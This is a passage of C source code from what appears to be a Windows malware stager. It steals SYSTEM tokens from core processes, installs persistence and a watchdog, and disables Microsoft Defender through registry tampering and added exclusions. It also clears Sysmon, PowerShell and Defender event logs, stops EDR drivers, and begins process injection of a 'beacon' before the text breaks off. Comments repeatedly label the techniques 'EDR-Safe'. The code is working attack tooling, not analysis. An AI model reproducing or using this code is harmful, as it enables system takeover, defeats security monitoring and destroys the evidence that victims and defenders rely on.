    LocalFree(pTokenPrivs);
    return TRUE;
}

static BOOL EnablePrivilegeForToken(HANDLE hToken, LPCSTR lpPrivilege) {
    TOKEN_PRIVILEGES tp = { 0 };
    if (!hToken || !lpPrivilege) {
        return FALSE;
    }

    if (!LookupPrivilegeValueA(NULL, lpPrivilege, &tp.Privileges[0].Luid)) {
        return FALSE;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    AdjustTokenPrivileges(hToken, FALSE, &tp, 0, NULL, NULL);
    return GetLastError() == ERROR_SUCCESS;
}

// Required for creating a child process from a duplicated token
static BOOL EnableSystemTokenPrivileges(HANDLE hToken) {
    if (!hToken) {
        return FALSE;
    }

    if (!EnableAllTokenPrivilegesInToken(hToken)) {
        LOGV("[-] Failed to enable all available token privileges on SYSTEM token\n");
    }

    BOOL bAssignPrimary = EnablePrivilegeForToken(hToken, SE_ASSIGNPRIMARYTOKEN_NAME);
    if (!bAssignPrimary) {
        LOGV("[-] Failed to enable SeAssignPrimaryTokenPrivilege on SYSTEM token (%lu)\n", GetLastError());
    }

    BOOL bIncreaseQuota = EnablePrivilegeForToken(hToken, SE_INCREASE_QUOTA_NAME);
    if (!bIncreaseQuota) {
        LOGV("[-] Failed to enable SeIncreaseQuotaPrivilege on SYSTEM token (%lu)\n", GetLastError());
    }

    return bAssignPrimary && bIncreaseQuota;
}

// Required for creating a primary-token process (safe spawn mode)
static BOOL EnableSystemProcessPrivileges() {
    HANDLE hToken = NULL;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        return FALSE;
    }

    BOOL bResult = PrepareSystemTokenPermissions(hToken);
    if (!bResult) {
        LOGV("[-] Failed to enable all available privileges on current process\n");
    }
    CloseHandle(hToken);
    return bResult;
}

// EDR-Safe: No suspicious API calls, uses legitimate token duplication
BOOL ElevatePrivileges() {
    HANDLE hToken = NULL, hDupToken = NULL;
    TOKEN_PRIVILEGES tkp;
    
    if (!OpenProcessToken(GetCurrentProcess(), 
        TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY | TOKEN_DUPLICATE, &hToken)) {
        return FALSE;
    }
    
    if (!DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL, 
        SecurityImpersonation, TokenPrimary, &hDupToken)) {
        CloseHandle(hToken);
        return FALSE;
    }

    if (!EnableAllTokenPrivilegesInToken(hDupToken)) {
        LOGV("[-] Failed to enable all available privileges on impersonation token\n");
    }
    
    LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &tkp.Privileges[0].Luid);
    tkp.PrivilegeCount = 1;
    tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    
    AdjustTokenPrivileges(hDupToken, FALSE, &tkp, 0, NULL, NULL);
    BOOL bResult = ImpersonateLoggedOnUser(hDupToken);
    
    CloseHandle(hDupToken);
    CloseHandle(hToken);
    return bResult;
}

static BOOL IsSystemCandidateProcessName(LPCWSTR lpExeName) {
    static const LPCWSTR candidateNames[] = {
        L"winlogon.exe",
        L"services.exe",
        L"wininit.exe"
    };

    for (int i = 0; i < (int)(sizeof(candidateNames) / sizeof(candidateNames[0])); i++) {
        if (_wcsicmp(lpExeName, candidateNames[i]) == 0) {
            return TRUE;
        }
    }

    return FALSE;
}

static BOOL IsSystemTokenCandidateBlacklisted(LPCWSTR lpExeName) {
    static const LPCWSTR blacklistedNames[] = {
        L"lsass.exe",
        L"csrss.exe",
        L"smss.exe",
        L"wininit.exe",
        L"lsm.exe",
        L"svchost.exe"
    };

    for (int i = 0; i < (int)(sizeof(blacklistedNames) / sizeof(blacklistedNames[0])); i++) {
        if (_wcsicmp(lpExeName, blacklistedNames[i]) == 0) {
            return TRUE;
        }
    }

    return FALSE;
}

static BOOL IsSystemTokenCandidateUsableForLaunch(LPCWSTR lpExeName, BOOL bCanLaunch) {
    if (!lpExeName) {
        return FALSE;
    }

    if (IsSystemTokenCandidateBlacklisted(lpExeName)) {
        return FALSE;
    }

    if (IsStrictSystemMode() && !bCanLaunch) {
        return FALSE;
    }

    return TRUE;
}

static BOOL IsSystemParentProcessBlacklisted(LPCWSTR lpExeName) {
    static const LPCWSTR blacklistedParents[] = {
        L"winlogon.exe",
        L"lsass.exe"
    };

    for (int i = 0; i < (int)(sizeof(blacklistedParents) / sizeof(blacklistedParents[0])); i++) {
        if (_wcsicmp(lpExeName, blacklistedParents[i]) == 0) {
            return TRUE;
        }
    }

    return FALSE;
}

// Verify whether token belongs to NT AUTHORITY\\SYSTEM
BOOL IsSystemToken(HANDLE hToken) {
    BOOL bIsSystem = FALSE;
    DWORD dwSize = 0;
    PTOKEN_USER pTokenUser = NULL;
    BYTE systemSid[SECURITY_MAX_SID_SIZE] = { 0 };
    DWORD systemSidSize = sizeof(systemSid);

    if (!hToken) {
        return FALSE;
    }

    if (!GetTokenInformation(hToken, TokenUser, NULL, 0, &dwSize) &&
        GetLastError() != ERROR_INSUFFICIENT_BUFFER) {
        return FALSE;
    }

    pTokenUser = (PTOKEN_USER)LocalAlloc(LPTR, dwSize);
    if (!pTokenUser) {
        return FALSE;
    }

    if (!GetTokenInformation(hToken, TokenUser, pTokenUser, dwSize, &dwSize)) {
        LocalFree(pTokenUser);
        return FALSE;
    }

    if (!CreateWellKnownSid(WinLocalSystemSid, NULL, systemSid, &systemSidSize)) {
        LocalFree(pTokenUser);
        return FALSE;
    }

    bIsSystem = EqualSid(pTokenUser->User.Sid, systemSid);
    LocalFree(pTokenUser);
    return bIsSystem;
}

static int GetSystemTokenPriority(LPCWSTR lpExeName, BOOL bCanLaunch) {
    if (!lpExeName) {
        return bCanLaunch ? 120 : 60;
    }

    int basePriority = bCanLaunch ? 1200 : 100;

    if (_wcsicmp(lpExeName, L"winlogon.exe") == 0) {
        return basePriority + 500;
    }
    if (_wcsicmp(lpExeName, L"lsass.exe") == 0) {
        return basePriority + 460;
    }
    if (_wcsicmp(lpExeName, L"services.exe") == 0) {
        return basePriority + 430;
    }
    if (_wcsicmp(lpExeName, L"wininit.exe") == 0) {
        return basePriority + 390;
    }
    if (_wcsicmp(lpExeName, L"csrss.exe") == 0) {
        return basePriority + 300;
    }
    if (_wcsicmp(lpExeName, L"lsm.exe") == 0) {
        return basePriority + 240;
    }
    if (_wcsicmp(lpExeName, L"smss.exe") == 0) {
        return basePriority + 200;
    }
    if (_wcsicmp(lpExeName, L"svchost.exe") == 0) {
        return basePriority + 120;
    }

    return basePriority;
}

static BOOL TokenHasPrivilege(HANDLE hToken, LPCSTR lpPrivilege) {
    DWORD dwSize = 0;
    PTOKEN_PRIVILEGES pTokenPrivs = NULL;
    BOOL bHas = FALSE;

    if (!hToken || !lpPrivilege) {
        return FALSE;
    }

    if (!GetTokenInformation(hToken, TokenPrivileges, NULL, 0, &dwSize)) {
        if (GetLastError() != ERROR_INSUFFICIENT_BUFFER) {
            return FALSE;
        }
    }

    pTokenPrivs = (PTOKEN_PRIVILEGES)LocalAlloc(LPTR, dwSize);
    if (!pTokenPrivs) {
        return FALSE;
    }

    if (!GetTokenInformation(hToken, TokenPrivileges, pTokenPrivs, dwSize, &dwSize)) {
        LocalFree(pTokenPrivs);
        return FALSE;
    }

    LUID luid = { 0 };
    if (!LookupPrivilegeValueA(NULL, lpPrivilege, &luid)) {
        LocalFree(pTokenPrivs);
        return FALSE;
    }

    for (DWORD i = 0; i < pTokenPrivs->PrivilegeCount; i++) {
        LUID compareLuid = pTokenPrivs->Privileges[i].Luid;
        if (compareLuid.LowPart == luid.LowPart && compareLuid.HighPart == luid.HighPart) {
            bHas = TRUE;
            break;
        }
    }

    LocalFree(pTokenPrivs);
    return bHas;
}

static BOOL IsProcessTokenSystem(HANDLE hProcess, DWORD dwPid, LPDWORD pdwErrorCode) {
    HANDLE hProcToken = NULL;
    BOOL bIsSystem = FALSE;

    if (pdwErrorCode) {
        *pdwErrorCode = ERROR_SUCCESS;
    }

    if (!hProcess) {
        if (pdwErrorCode) {
            *pdwErrorCode = ERROR_INVALID_HANDLE;
        }
        LOGE("[-] Cannot verify SYSTEM context for PID %lu: invalid process handle\n", dwPid);
        return FALSE;
    }

    if (!OpenProcessToken(hProcess, TOKEN_QUERY, &hProcToken)) {
        if (pdwErrorCode) {
            *pdwErrorCode = GetLastError();
        }
        LOGE("[-] OpenProcessToken on PID %lu failed during SYSTEM verification (%lu)\n", dwPid, GetLastError());
        return FALSE;
    }

    bIsSystem = IsSystemToken(hProcToken);

    if (!bIsSystem && pdwErrorCode) {
        *pdwErrorCode = ERROR_BAD_TOKEN_TYPE;
    }

    if (!bIsSystem) {
        PTOKEN_USER pTokenUser = NULL;
        DWORD tokenSize = 0;
        if (!GetTokenInformation(hProcToken, TokenUser, NULL, 0, &tokenSize) &&
            GetLastError() != ERROR_INSUFFICIENT_BUFFER) {
            LOGE("[-] Failed to query child token user SID for PID %lu (%lu)\n", dwPid, GetLastError());
        } else if (tokenSize > 0) {
            pTokenUser = (PTOKEN_USER)LocalAlloc(LPTR, tokenSize);
            if (pTokenUser) {
                if (GetTokenInformation(hProcToken, TokenUser, pTokenUser, tokenSize, &tokenSize)) {
                    char accountName[256] = { 0 };
                    char domainName[256] = { 0 };
                    DWORD accountLen = (DWORD)(sizeof(accountName));
                    DWORD domainLen = (DWORD)(sizeof(domainName));
                    SID_NAME_USE sidType = SidTypeUnknown;

                    if (LookupAccountSidA(NULL, pTokenUser->User.Sid, accountName,
                            &accountLen, domainName, &domainLen, &sidType)) {
                        LOGE("[-] Process launch target PID %lu is running as %s\\\\%s (type=%lu)\n",
                            dwPid, domainName, accountName, (unsigned long)sidType);
                    } else {
                        LOGE("[-] Process launch target PID %lu token identity lookup failed (%lu)\n",
                            dwPid, GetLastError());
                    }
                }

                LocalFree(pTokenUser);
            }
        }
        LOGE("[-] Process launch target PID %lu is not NT AUTHORITY\\SYSTEM\n", dwPid);
        CloseHandle(hProcToken);
        return FALSE;
    }

    CloseHandle(hProcToken);
    return TRUE;
}

// EDR-Safe SYSTEM Escalation: Token theft from candidate SYSTEM processes
BOOL GetSystem(HANDLE* phSystemToken) {
    if (!phSystemToken) {
        return FALSE;
    }

    *phSystemToken = NULL;
    DWORD currentPid = GetCurrentProcessId();
    DWORD currentSession = (DWORD)-1;
    if (!ProcessIdToSessionId(currentPid, &currentSession)) {
        currentSession = (DWORD)-1;
    }

    // Fast path: current process is already SYSTEM (no theft required).
    HANDLE hSelfToken = NULL;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_DUPLICATE | TOKEN_QUERY, &hSelfToken)) {
        if (IsSystemToken(hSelfToken)) {
            HANDLE hSystemSelfToken = NULL;
            if (DuplicateTokenEx(hSelfToken, MAXIMUM_ALLOWED, NULL,
                SecurityImpersonation, TokenPrimary, &hSystemSelfToken)) {
                LOGV("[+] Current process token is already NT AUTHORITY\\SYSTEM\n");
                *phSystemToken = hSystemSelfToken;
                CloseHandle(hSelfToken);
                return TRUE;
            }
            LOGV("[-] Failed to duplicate current SYSTEM token (%lu)\n", GetLastError());
        }
        CloseHandle(hSelfToken);
    }

    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) {
        LOGE("[-] CreateToolhelp32Snapshot failed (%lu)\n", GetLastError());
        return FALSE;
    }

    HANDLE hSessionToken = NULL;
    HANDLE hCurrentSessionToken = NULL;
    DWORD fallbackSession = (DWORD)-1;
    WCHAR fallbackName[MAX_PATH] = { 0 };
    DWORD fallbackPid = 0;
    int currentPriority = -1;
    int fallbackPriority = -1;
    PROCESSENTRY32W pe32 = { sizeof(pe32) };

    if (!Process32FirstW(hSnap, &pe32)) {
        LOGE("[-] Process enumeration failed (%lu)\n", GetLastError());
        CloseHandle(hSnap);
        return FALSE;
    }

    do {
        if (!IsSystemCandidateProcessName(pe32.szExeFile)) {
            continue;
        }
        if (IsSystemTokenCandidateBlacklisted(pe32.szExeFile)) {
            LOGV("[*] Skipping blacklisted SYSTEM token candidate %ls\n", pe32.szExeFile);
            continue;
        }

        DWORD tokenSession = (DWORD)-1;
        HANDLE hProcess = NULL;
        HANDLE hToken = NULL;
        HANDLE hDupToken = NULL;

        hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pe32.th32ProcessID);
        if (!hProcess) {
            LOGV("[-] OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION) failed for %ls PID %lu (%lu)\n",
                pe32.szExeFile, pe32.th32ProcessID, GetLastError());
            continue;
        }

        if (!OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_QUERY, &hToken)) {
            DWORD openErr = GetLastError();
            LOGV("[-] OpenProcessToken failed for %ls PID %lu with duplicate+query (%lu)\n",
                pe32.szExeFile, pe32.th32ProcessID, openErr);

            if (openErr == ERROR_ACCESS_DENIED && !OpenProcessToken(hProcess, TOKEN_QUERY, &hToken)) {
                LOGV("[-] OpenProcessToken retry with TOKEN_QUERY failed for %ls PID %lu (%lu)\n",
                    pe32.szExeFile, pe32.th32ProcessID, GetLastError());
                CloseHandle(hProcess);
                continue;
            }
            if (openErr != ERROR_ACCESS_DENIED && !hToken) {
                LOGV("[-] OpenProcessToken failed for %ls PID %lu with unexpected error (%lu)\n",
                    pe32.szExeFile, pe32.th32ProcessID, openErr);
                CloseHandle(hProcess);
                continue;
            }
            if (!hToken) {
                CloseHandle(hProcess);
                continue;
            }
        }

        if (!IsSystemToken(hToken)) {
            LOGV("[-] %ls PID %lu is not SYSTEM token\n", pe32.szExeFile, pe32.th32ProcessID);
            CloseHandle(hToken);
            CloseHandle(hProcess);
            continue;
        }

        if (!ProcessIdToSessionId(pe32.th32ProcessID, &tokenSession)) {
            tokenSession = (DWORD)-1;
        }

        BOOL bHasAssignPrimary = TokenHasPrivilege(hToken, SE_ASSIGNPRIMARYTOKEN_NAME);
        BOOL bHasIncreaseQuota = TokenHasPrivilege(hToken, SE_INCREASE_QUOTA_NAME);
        BOOL bCanLaunch = bHasAssignPrimary && bHasIncreaseQuota;
        if (!IsSystemTokenCandidateUsableForLaunch(pe32.szExeFile, bCanLaunch)) {
            LOGV("[-] Skipping SYSTEM candidate %ls PID %lu (not allowed by policy)\n",
                pe32.szExeFile, pe32.th32ProcessID);
            CloseHandle(hToken);
            CloseHandle(hProcess);
            continue;
        }

        int tokenPriority = GetSystemTokenPriority(pe32.szExeFile, bCanLaunch);
        LOGV("[*] SYSTEM candidate %ls PID %lu session %lu (launch=%s, priority=%d)\n",
            pe32.szExeFile, pe32.th32ProcessID, tokenSession,
            bCanLaunch ? "yes" : "no", tokenPriority);
        if (!bHasAssignPrimary || !bHasIncreaseQuota) {
            LOGV("[*] Candidate %ls PID %lu is SYSTEM but does not expose launch privileges (AssignPrimary=%s, IncreaseQuota=%s)\n",
                pe32.szExeFile, pe32.th32ProcessID,
                bHasAssignPrimary ? "yes" : "no",
                bHasIncreaseQuota ? "yes" : "no");
        }

        if (!DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL,
            SecurityImpersonation, TokenPrimary, &hDupToken)) {
            LOGE("[-] DuplicateTokenEx failed for %ls PID %lu (%lu)\n",
                pe32.szExeFile, pe32.th32ProcessID, GetLastError());
            CloseHandle(hToken);
            CloseHandle(hProcess);
            continue;
        }

        if (tokenSession == currentSession) {
            LOGV("[+] Candidate SYSTEM token from %ls PID %lu in current session\n",
                pe32.szExeFile, pe32.th32ProcessID);
            if (!hCurrentSessionToken || tokenPriority > currentPriority) {
                if (hCurrentSessionToken) {
                    CloseHandle(hCurrentSessionToken);
                }
                hCurrentSessionToken = hDupToken;
                currentPriority = tokenPriority;
            } else {
                CloseHandle(hDupToken);
            }
            CloseHandle(hToken);
            CloseHandle(hProcess);
            continue;
        }

        if (!hSessionToken || tokenPriority > fallbackPriority) {
            if (hSessionToken) {
                CloseHandle(hSessionToken);
            }
            hSessionToken = hDupToken;
            _snwprintf(fallbackName, STAGE_ARRAY_COUNT(fallbackName), L"%ls", pe32.szExeFile);
            fallbackSession = tokenSession;
            fallbackPid = pe32.th32ProcessID;
            fallbackPriority = tokenPriority;
            LOGV("[+] Found higher-priority fallback SYSTEM token from %ls PID %lu (session %lu, priority=%d)\n",
                pe32.szExeFile, pe32.th32ProcessID, tokenSession, tokenPriority);
        } else {
            LOGV("[-] Skipping lower-priority SYSTEM token from %ls PID %lu (session %lu, priority=%d)\n",
                pe32.szExeFile, pe32.th32ProcessID, tokenSession, tokenPriority);
            CloseHandle(hDupToken);
        }
        CloseHandle(hToken);
        CloseHandle(hProcess);
        continue;

    } while (Process32NextW(hSnap, &pe32));

    if (hCurrentSessionToken) {
        LOGV("[+] Using best SYSTEM token from current session (score=%d)\n", currentPriority);
        *phSystemToken = hCurrentSessionToken;
        CloseHandle(hSnap);
        return TRUE;
    }

    if (hSessionToken) {
        LOGV("[+] Using fallback SYSTEM token from %ls PID %lu (session %lu, score=%d)\n",
            fallbackName, fallbackPid, fallbackSession, fallbackPriority);
        *phSystemToken = hSessionToken;
        CloseHandle(hSnap);
        return TRUE;
    }

    CloseHandle(hSnap);
    return FALSE;
}

// EDR-Safe Persistence: Standard registry keys
BOOL CreatePersistence(LPCSTR lpStagerPath) {
    if (!lpStagerPath || !*lpStagerPath) {
        return FALSE;
    }

    if (STAGE_PERSISTENCE_MODE == 0) {
        return TRUE;
    }

    int mode = STAGE_PERSISTENCE_MODE;
    if (mode < 0) {
        mode = 0;
    } else if (mode > 3) {
        mode = 3;
    }

    if (!InstallPersistenceArtifacts(lpStagerPath, mode)) {
        LOGV("[-] Persistence install reported failure, proceeding based on compile-time policy\n");
        return FALSE;
    }
    LOGV("[+] Persistence installed via module layer (mode=%d)\n", mode);
    return TRUE;
}

static BOOL CreatePersistenceAsSystemToken(HANDLE hSystemToken, LPCSTR lpStagerPath) {
    if (!hSystemToken || !lpStagerPath || !*lpStagerPath) {
        return FALSE;
    }

    int mode = STAGE_PERSISTENCE_MODE;
    if (mode < 0) {
        mode = 0;
    } else if (mode > 3) {
        mode = 3;
    }

    if (mode == 0) {
        return TRUE;
    }

    BOOL bInstalled = InstallPersistenceArtifactsWithToken(hSystemToken, lpStagerPath, mode);
    return bInstalled;
}

static BOOL CreateWatchdogAsSystemToken(HANDLE hSystemToken, LPCSTR lpStagerPath) {
    if (!hSystemToken || !lpStagerPath || !*lpStagerPath) {
        return FALSE;
    }

    BOOL bInstalled = InstallWatchdogWithToken(hSystemToken, lpStagerPath);
    return bInstalled;
}

static BOOL ExecuteSystemCommand(HANDLE hSystemToken, LPCSTR lpCommandLine) {
    if (!hSystemToken || !lpCommandLine || !*lpCommandLine) {
        return FALSE;
    }

    HANDLE hImpersonationToken = NULL;
    if (!DuplicateTokenForImpersonation(hSystemToken, &hImpersonationToken)) {
        return FALSE;
    }

    if (!SetThreadToken(NULL, hImpersonationToken)) {
        CloseHandle(hImpersonationToken);
        return FALSE;
    }

    char commandLine[1024] = {0};
    char systemDir[MAX_PATH] = {0};
    char cmdPath[MAX_PATH] = {0};

    if (!GetSystemDirectoryA(systemDir, MAX_PATH)) {
        _snprintf(systemDir, MAX_PATH, "C:\\Windows\\System32");
    }
    if (_snprintf(cmdPath, MAX_PATH, "%s\\cmd.exe", systemDir) < 0) {
        RevertToSelf();
        CloseHandle(hImpersonationToken);
        return FALSE;
    }

    if (_snprintf(commandLine, sizeof(commandLine), "\"%s\" /d /c \"%s\"", cmdPath, lpCommandLine) < 0) {
        RevertToSelf();
        CloseHandle(hImpersonationToken);
        return FALSE;
    }

    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);
    si.lpDesktop = "winsta0\\default";

    BOOL bSuccess = FALSE;
    if (CreateProcessA(
            NULL,
            commandLine,
            NULL,
            NULL,
            FALSE,
            CREATE_NO_WINDOW | CREATE_NEW_PROCESS_GROUP,
            NULL,
            NULL,
            &si,
            &pi
        )) {
        WaitForSingleObject(pi.hProcess, 15000);

        DWORD exitCode = 0xFFFFFFFF;
        if (GetExitCodeProcess(pi.hProcess, &exitCode) && exitCode == 0) {
            bSuccess = TRUE;
        }

        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
    }

    RevertToSelf();
    CloseHandle(hImpersonationToken);
    return bSuccess;
}

#if STAGE_DISABLE_EDR_HARDENING
static BOOL DisableDefenderViaServiceDependency(HANDLE hSystemToken) {
    if (!ImpersonateLoggedOnUser(hSystemToken)) {
        LOGV("[-] Failed to impersonate SYSTEM for Defender service dependency update\n");
        return FALSE;
    }

    HKEY hKey = NULL;
    LONG result = RegOpenKeyExA(
        HKEY_LOCAL_MACHINE,
        "SYSTEM\\CurrentControlSet\\Services\\WinDefend",
        0,
        KEY_SET_VALUE,
        &hKey
    );
    if (result != ERROR_SUCCESS) {
        LOGV("[-] Failed to open WinDefend service key (%ld)\n", result);
        RevertToSelf();
        return FALSE;
    }

    const char deps[] = "RpcSs\0FakeService-DISABLED\0";
    result = RegSetValueExA(
        hKey,
        "DependOnService",
        0,
        REG_MULTI_SZ,
        (BYTE*)deps,
        sizeof(deps)
    );
    RegCloseKey(hKey);
    RevertToSelf();

    if (result == ERROR_SUCCESS) {
        LOGV("[+] WinDefend service dependency neutered\n");
        return TRUE;
    }

    LOGV("[-] Failed to set WinDefend dependency (%ld)\n", result);
    return FALSE;
}

static BOOL AddDefenderExclusions(HANDLE hSystemToken) {
    if (!ImpersonateLoggedOnUser(hSystemToken)) {
        LOGV("[-] Failed to impersonate SYSTEM for Defender exclusions\n");
        return FALSE;
    }

    BOOL bAllSuccess = TRUE;
    HKEY hKey = NULL;
    const DWORD zero = 0;
    LONG result = ERROR_SUCCESS;

    result = RegCreateKeyExA(
        HKEY_LOCAL_MACHINE,
        "SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths",
        0,
        NULL,
        0,
        KEY_SET_VALUE,
        NULL,
        &hKey,
        NULL
    );
    if (result == ERROR_SUCCESS) {
        RegSetValueExA(hKey, "C:\\Windows\\System32", 0, REG_DWORD, (BYTE*)&zero, sizeof(zero));
        RegSetValueExA(hKey, "C:\\Windows\\Temp", 0, REG_DWORD, (BYTE*)&zero, sizeof(zero));
        RegCloseKey(hKey);
    } else {
        bAllSuccess = FALSE;
    }

    result = RegCreateKeyExA(
        HKEY_LOCAL_MACHINE,
        "SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Processes",
        0,
        NULL,
        0,
        KEY_SET_VALUE,
        NULL,
        &hKey,
        NULL
    );
    if (result == ERROR_SUCCESS) {
        RegSetValueExA(hKey, "RuntimeBroker.exe", 0, REG_DWORD, (BYTE*)&zero, sizeof(zero));
        RegSetValueExA(hKey, "dllhost.exe", 0, REG_DWORD, (BYTE*)&zero, sizeof(zero));
        RegSetValueExA(hKey, "svchost.exe", 0, REG_DWORD, (BYTE*)&zero, sizeof(zero));
        RegCloseKey(hKey);
    } else {
        bAllSuccess = FALSE;
    }

    RevertToSelf();
    if (bAllSuccess) {
        LOGV("[+] Defender exclusions added\n");
    } else {
        LOGV("[-] Some Defender exclusions could not be set\n");
    }
    return bAllSuccess;
}

static BOOL ClearSpecificEventLogs(HANDLE hSystemToken) {
    if (!ImpersonateLoggedOnUser(hSystemToken)) {
        LOGV("[-] Failed to impersonate SYSTEM for event log cleanup\n");
        return FALSE;
    }

    const char* logsToClear[] = {
        "Microsoft-Windows-Sysmon/Operational",
        "Microsoft-Windows-PowerShell/Operational",
        "Microsoft-Windows-Windows Defender/Operational",
        NULL
    };

    int cleared = 0;
    for (int i = 0; logsToClear[i]; i++) {
        WCHAR wLogName[256] = {0};
        MultiByteToWideChar(CP_ACP, 0, logsToClear[i], -1, wLogName, STAGE_ARRAY_COUNT(wLogName));
        if (EvtClearLog(NULL, wLogName, NULL, 0)) {
            cleared++;
        }
    }

    RevertToSelf();
    if (cleared > 0) {
        LOGV("[+] Cleared %d event logs\n", cleared);
        return TRUE;
    }

    LOGV("[-] Failed to clear any event logs\n");
    return FALSE;
}

static BOOL IsBlacklistedEdrServiceName(LPCSTR lpServiceName) {
    static const char* kCriticalServicesToSkip[] = {
        "WinDefend",
        "WdNisSvc",
        "Sense",
        "sgrmbroker",
        "wscsvc",
        "DcomLaunch",
        "RpcSs",
        NULL
    };

    for (int i = 0; kCriticalServicesToSkip[i]; i++) {
        if (_stricmp(lpServiceName, kCriticalServicesToSkip[i]) == 0) {
            return TRUE;
        }
    }

    return FALSE;
}

static BOOL UnloadEDRDrivers(HANDLE hSystemToken) {
    const char* edrDrivers[] = {
        "WdFilter",
        "WdBoot",
        "SentinelMonitor",
        "hexisfsmonitor",
        "groundling",
        "cyverak",
        "parity",
        NULL
    };

    int unloaded = 0;
    for (int i = 0; edrDrivers[i]; i++) {
        if (IsBlacklistedEdrServiceName(edrDrivers[i])) {
            LOGV("[*] Skipping service hardening stop for safety blacklist: %s\n", edrDrivers[i]);
            continue;
        }

        char cmd[256] = {0};
        if (_snprintf(cmd, sizeof(cmd), "sc stop %s", edrDrivers[i]) < 0) {
            continue;
        }

        if (ExecuteSystemCommand(hSystemToken, cmd)) {
            unloaded++;
            LOGV("[+] Issued stop for EDR driver/service: %s\n", edrDrivers[i]);
        } else {
            LOGV("[-] Failed to stop EDR service: %s\n", edrDrivers[i]);
        }
    }

    return unloaded > 0;
}
#else
static BOOL DisableDefenderViaServiceDependency(HANDLE hSystemToken) {
    UNREFERENCED_PARAMETER(hSystemToken);
    return TRUE;
}

static BOOL AddDefenderExclusions(HANDLE hSystemToken) {
    UNREFERENCED_PARAMETER(hSystemToken);
    return TRUE;
}

static BOOL ClearSpecificEventLogs(HANDLE hSystemToken) {
    UNREFERENCED_PARAMETER(hSystemToken);
    return TRUE;
}

static BOOL UnloadEDRDrivers(HANDLE hSystemToken) {
    UNREFERENCED_PARAMETER(hSystemToken);
    return TRUE;
}
#endif

// ============================================================================
// PROCESS HOLLOWING + APC INJECTION
// ============================================================================

BOOL IsProcessAccessible(DWORD dwPID) {
    HANDLE hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_LIMITED_INFORMATION |
        PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, dwPID);
    if (hProcess) {
        CloseHandle(hProcess);
        return TRUE;
    }
    return FALSE;
}
DWORD FindTargetProcess(BOOL bSystemLevel) {
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) {
        return 0;
    }

    PROCESSENTRY32W pe32 = { sizeof(pe32) };
    DWORD targetPID = 0;
    WCHAR stagerPath[MAX_PATH] = { 0 };
    const WCHAR* systemTargets[] = {
        L"winlogon.exe",
    };
    const WCHAR* userTargets[] = {
        L"explorer.exe",
        L"RuntimeBroker.exe",
        L"svchost.exe",
        L"dllhost.exe",
        L"SearchHost.exe",
    };

    if (bSystemLevel && !STAGE_SYSTEM_INJECTION) {
        LOGV("[*] SYSTEM injection disabled at build-time, using user-mode targets\n");
    }

    const WCHAR** targets = (bSystemLevel && STAGE_SYSTEM_INJECTION) ? systemTargets : userTargets;
    DWORD targetCount = (bSystemLevel && STAGE_SYSTEM_INJECTION) ? STAGE_ARRAY_COUNT(systemTargets) : STAGE_ARRAY_COUNT(userTargets);

    if (Process32FirstW(hSnap, &pe32)) {
        do {
            for (DWORD i = 0; i < targetCount; i++) {
                if (_wcsicmp(pe32.szExeFile, targets[i]) == 0) {
                    if (IsProcessAccessible(pe32.th32ProcessID)) {
                        targetPID = pe32.th32ProcessID;
                        swprintf(stagerPath, MAX_PATH, L"%ls", pe32.szExeFile);
                        LOGV("[+] Found accessible target: %ls (PID %u)\n", stagerPath, targetPID);
                        break;
                    }
                }
            }

            if (targetPID) {
                break;
            }
        } while (Process32NextW(hSnap, &pe32));
    }

    CloseHandle(hSnap);

    if (!targetPID) {
        hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (hSnap != INVALID_HANDLE_VALUE) {
            if (Process32FirstW(hSnap, &pe32)) {
                do {
                    if (_wcsicmp(pe32.szExeFile, L"explorer.exe") == 0) {
                        targetPID = pe32.th32ProcessID;
                        LOGV("[+] Fallback to explorer.exe (PID %u)\n", targetPID);
                        break;
                    }
                } while (Process32NextW(hSnap, &pe32));
            }
            CloseHandle(hSnap);
        }
    }

    return targetPID;
}

HANDLE GetMainThread(DWORD dwPID) {
    HANDLE hThreadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    THREADENTRY32 te32 = { sizeof(te32) };
    HANDLE hThread = NULL;
    
    if (Thread32First(hThreadSnap, &te32)) {
        do {
            if (te32.th32OwnerProcessID == dwPID) {
                hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, te32.th32ThreadID);
                break;
            }
        } while (Thread32Next(hThreadSnap, &te32));
    }
    
    CloseHandle(hThreadSnap);
    return hThread;
}

// EDR-Safe Injection: RW allocation -> write -> RX protection (not RWX)
BOOL HollowAndInject(PBYTE pBeacon, DWORD dwBeaconSize, BOOL bSystemLevel) {
    if (IsValidPePayload(pBeacon, dwBeaconSize)) {
        LOGE("[-] Stage2 is PE payload; direct thread/APC injection is not supported for this format.\n");
        return FALSE;
    }

    DWORD targetPID = FindTargetProcess(bSystemLevel);
    
    if (!targetPID) {
        LOGE("[-] No accessible %s target found\n", bSystemLevel ? "SYSTEM" : "user-mode");
        return FALSE;
    }
    
    DWORD dwProcessAccess = PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
        PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ;
